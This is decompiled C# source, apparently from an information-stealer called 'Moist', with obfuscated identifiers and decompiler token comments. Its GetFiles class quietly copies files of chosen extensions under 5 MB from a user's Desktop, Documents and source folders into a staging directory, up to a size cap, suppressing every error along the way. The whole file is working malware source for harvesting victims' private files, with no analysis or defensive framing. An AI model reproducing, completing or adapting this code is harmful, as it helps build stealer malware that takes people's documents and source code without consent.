using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;

namespace Moist
{
	// Token: 0x0200004A RID: 74
	public class GetFiles
	{
		// Token: 0x06000211 RID: 529 RVA: 0x000108E4 File Offset: 0x0000EAE4
		public static void Inizialize(string Moist_Dir)
		{
			try
			{
				string text = Moist_Dir + "\\Files";
				Directory.CreateDirectory(text);
				if (!Directory.Exists(text))
				{
					GetFiles.Inizialize(text);
				}
				else
				{
					GetFiles.CopyDirectory(Help.DesktopPath, text, "*.*", (long)Class1.int_0);
					GetFiles.CopyDirectory(Help.MyDocuments, text, "*.*", (long)Class1.int_0);
					GetFiles.CopyDirectory(Help.UserProfile + "\\source", text, "*.*", (long)Class1.int_0);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000212 RID: 530 RVA: 0x0001097C File Offset: 0x0000EB7C
		private static long smethod_0(string string_0, long long_0 = 0L)
		{
			try
			{
				foreach (string fileName in Directory.EnumerateFiles(string_0))
				{
					try
					{
						long_0 += new FileInfo(fileName).Length;
					}
					catch
					{
					}
				}
				foreach (string string_ in Directory.EnumerateDirectories(string_0))
				{
					try
					{
						long_0 += GetFiles.smethod_0(string_, 0L);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return long_0;
		}

		// Token: 0x06000213 RID: 531 RVA: 0x00010A54 File Offset: 0x0000EC54
		public static void CopyDirectory(string source, string target, string pattern, long maxSize)
		{
			Stack<GetFiles.Folders> stack = new Stack<GetFiles.Folders>();
			stack.Push(new GetFiles.Folders(source, target));
			long num = GetFiles.smethod_0(target, 0L);
			while (stack.Count > 0)
			{
				GetFiles.Folders folders = stack.Pop();
				try
				{
					Directory.CreateDirectory(folders.Target);
					foreach (string text in Directory.EnumerateFiles(folders.Source, pattern))
					{
						try
						{
							if (Array.IndexOf<string>(Class1.string_1, Path.GetExtension(text).ToLower()) >= 0)
							{
								string text2 = Path.Combine(folders.Target, Path.GetFileName(text));
								if (new FileInfo(text).Length / 1024L < 5000L)
								{
									File.Copy(text, text2);
									num += new FileInfo(text2).Length;
									if (num > maxSize)
									{
										return;
									}
									GetFiles.count++;
								}
							}
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
					continue;
				}
				catch (PathTooLongException)
				{
					continue;
				}
				try
				{
					foreach (string text3 in Directory.EnumerateDirectories(folders.Source))
					{
						try
						{
							if (!text3.Contains(Path.Combine(Help.DesktopPath, Environment.UserName)))
							{
								stack.Push(new GetFiles.Folders(text3, Path.Combine(folders.Target, Path.GetFileName(text3))));
							}
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch (DirectoryNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
			}
			stack.Clear();
		}

		// Token: 0x06000214 RID: 532 RVA: 0x0000446C File Offset: 0x0000266C
		public GetFiles()
		{
			Class40.gcO0h7LzslQIW();
			base..ctor();
		}

		// Token: 0x040000F3 RID: 243
		public static int count;

		// Token: 0x0200004B RID: 75
		public class Folders : IFolders
		{
			// Token: 0x17000048 RID: 72
			// (get) Token: 0x06000215 RID: 533 RVA: 0x00005134 File Offset: 0x00003334
			// (set) Token: 0x06000216 RID: 534 RVA: 0x0000513C File Offset: 0x0000333C
			public string Source { get; private set; }

			// Token: 0x17000049 RID: 73
			// (get) Token: 0x06000217 RID: 535 RVA: 0x00005145 File Offset: 0x00003345
			// (set) Token: 0x06000218 RID: 536 RVA: 0x0000514D File Offset: 0x0000334D
			public string Target { get; private set; }

			// Token: 0x06000219 RID: 537 RVA: 0x00005156 File Offset: 0x00003356
			public Folders(string source, string target)
			{
				Class40.gcO0h7LzslQIW();
				base..ctor();
				this.Source = source;
				this.Target = target;
			}

			// Token: 0x040000F4 RID: 244
			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			[CompilerGenerated]
			private string string_0;

			// Token: 0x040000F5 RID: 245
			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			[CompilerGenerated]
			private string string_1;
		}
	}
}
